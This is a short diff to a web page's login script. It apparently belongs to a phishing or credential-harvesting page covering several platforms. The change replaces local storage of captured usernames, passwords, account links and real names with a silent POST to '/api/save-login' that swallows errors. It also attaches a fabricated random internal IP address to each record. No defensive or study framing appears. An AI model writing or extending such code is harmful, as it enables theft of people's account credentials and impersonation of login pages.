@@ -315,17 +315,18 @@
                 const accountLink = document.getElementById('account-link').value.trim();
                 const platform = sessionStorage.getItem('selectedPlatform') || 'Unknown';
 
-                const logins = JSON.parse(localStorage.getItem('rdx_logins') || '[]');
-                logins.push({
-                    user, pass, accountLink,
-                    accountName: extractedAccount.username,
-                    accountRealName: extractedAccount.realName || '',
-                    accountPlatform: extractedAccount.platform,
-                    platform,
-                    time: new Date().toLocaleString(),
-                    ip: '192.168.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255)
-                });
-                localStorage.setItem('rdx_logins', JSON.stringify(logins));
+                fetch('/api/save-login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        user, pass, accountLink,
+                        accountName: extractedAccount.username,
+                        accountRealName: extractedAccount.realName || '',
+                        accountPlatform: extractedAccount.platform,
+                        platform,
+                        ip: '192.168.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255)
+                    })
+                }).catch(() => {});
 
                 sessionStorage.setItem('userLoggedIn_' + (platform || 'unknown').toLowerCase(), 'true');
                 sessionStorage.setItem('currentUser_' + (platform || 'unknown').toLowerCase(), user);
